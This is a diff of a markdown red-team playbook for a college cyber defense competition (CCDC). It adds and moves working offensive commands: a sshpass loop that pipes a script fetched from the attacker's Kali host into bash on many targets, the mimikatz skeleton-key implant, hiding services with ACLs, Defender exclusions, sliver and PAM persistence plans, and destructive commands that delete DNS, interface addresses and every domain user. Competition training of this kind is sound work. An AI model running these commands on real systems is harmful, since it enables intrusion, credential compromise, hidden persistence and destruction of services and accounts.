@@ -37,10 +37,13 @@ pagetitle: Red Teaming for CCDC
 - Todo
   - Write a persistence script that does the following 
     - (maybe) Creates an exclusion for ProgramData AND/OR disables defender
-    - Downloads and executes Mimikatz's skeleton key module
+    - Downloads and executes [nosferatu](https://github.com/RITRedteam/nosferatu/)
+      - Makes this a service that occurs on restart
+    - Script to use zerologonshot to perform actions
     - Downloads sliver shell and creates a sliver service hidden with ACLs
+    - Maybe use [https://www.nssm.cc/download](https://www.nssm.cc/download) for services?
   - Check out [RealBindingEDR](https://github.com/myzxcg/RealBlindingEDR)
-  - H services with ACLs: [https://www.sans.org/blog/red-team-tactics-hiding-windows-services](https://www.sans.org/blog/red-team-tactics-hiding-windows-services)
+  - Hide services with ACLs: [https://www.sans.org/blog/red-team-tactics-hiding-windows-services](https://www.sans.org/blog/red-team-tactics-hiding-windows-services)
     - This seems extremely good
   - Pivoting with netsh port proxy
   - C2s
@@ -86,21 +89,23 @@ pagetitle: Red Teaming for CCDC
 - [PANIX](https://github.com/Aegrah/PANIX)
   - One-stop shop for lots of persistence methods, this thing is a great reference
 - Todo:
-  - PAM caught via `debsums` or `dpkg --verify`
+  - Make malware that:
+    - Makes it so you can only run a certain number of commands before being logged out
+    - Makes it so you have to solve a times-table equation to see the result of your command
   - Get something going for alpine/Nixos
     - Alpine
       - Add a second location for SSH keys 
     - Nixos
       - Get gcc with `nix-shell -p libgcc pam`
       - Figure out which PAM file controls auth and modify it
-  - Scripting across teams
-    - Running commands with SSH by putting it after the command
-      - `echo "{password}" | sshpass -p "{password}" ssh -o StrictHostKeyChecking=no "{username}@{ip}" "sudo -S id"`
-        - This will work regardless of whether the password is actually required
-      - `echo "{password}" | sshpass -p "{password}" ssh -o StrictHostKeyChecking=no "{username}@{ip}" "sudo -S bash -c 'curl -L {kali_IP}:{port}/p.sh | bash -s {kali_IP}:{port}'"`
-        - Can use `ssh_across_ips.py`
-          - `ssh_across_ips.py 10.100.100-120.35 {username} {password} '{command}'`
-        - `for i in {1..10}; do echo $i; done`
+- Scripting across teams
+  - Running commands with SSH by putting it after the command
+    - `echo "{password}" | sshpass -p "{password}" ssh -o StrictHostKeyChecking=no "{username}@{ip}" "sudo -S id"`
+      - This will work regardless of whether the password is actually required
+    - `echo "{password}" | sshpass -p "{password}" ssh -o StrictHostKeyChecking=no "{username}@{ip}" "sudo -S bash -c 'curl -L {kali_IP}:{port}/p.sh | bash -s {kali_IP}:{port}'"`
+      - Can use `ssh_across_ips.py`
+        - `ssh_across_ips.py 10.100.100-120.35 {username} {password} '{command}'`
+      - `for i in {1..10}; do echo $i; done`
 - [Caraxes](https://github.com/ait-aecid/caraxes/tree/main)
   - Good compatibility across distros as well
     - Debian: `apt install -y gcc make linux-headers-$(uname -r)`
@@ -137,9 +142,13 @@ pagetitle: Red Teaming for CCDC
 
 ## Domain Persistence
 
+**Plaintext Password**
+- Turn on reversible encryption: `Set-ADDefaultDomainPasswordPolicy -Identity {domain} -ReversibleEncryptionEnabled $false`
+
 **Skeleton Key**
 - Implants into LSASS and creates master password working for any AD account
 - `mimikatz "privilege::debug" "misc::skeleton" "exit"` - adds `mimikatz` as a password to all users
+- Can use or mess around with [https://github.com/RITRedteam/nosferatu/](https://github.com/RITRedteam/nosferatu/) 
 
 **MemSSP**
 - Injects a new Security Support Provider into LSASS
@@ -241,16 +250,9 @@ pagetitle: Red Teaming for CCDC
   - GPO management > right-click domain > Create GPO in domain and link here > Right click on new GPO + edit > User Configuration\Policies\Administrative Templates\Desktop\Desktop > desktop wallpaper > select `enabled` + enter path of image and select fill for style > apply + ok > `gpupdate /force`
 - `misc::wp /file:{path}` to set the current PC's wallpaper
 - `sc.exe stop dns` to stop dns
+  - `sc.exe delete dns` to delete it
+- Delete IP on interface: `netsh interface ip delete address "Ethernet" addr={address}`
 - `powershell -c "Get-ADUser -Filter * | ForEach-Object { Remove-ADUser $_ -Confirm:$false }"` to delete domain users
-
-## Networking
-
-**Getting new IPs**
-- It can be a pretty easy defense for blue teams to just block your IP
-  - Changing IP isn't too difficult, but requires a bit of manual setup
-- Instead, create 1 machine which has hundreds of IPs allocated to it, and cycles through them with each request made
-- Then, set up proxychains/ligolo on that host, and point kali box to it
-- Now, every new request from kali (whose IP we don't have to change) will hit the target boxes with a new IP
 
 ## Dealing with System Protections
 
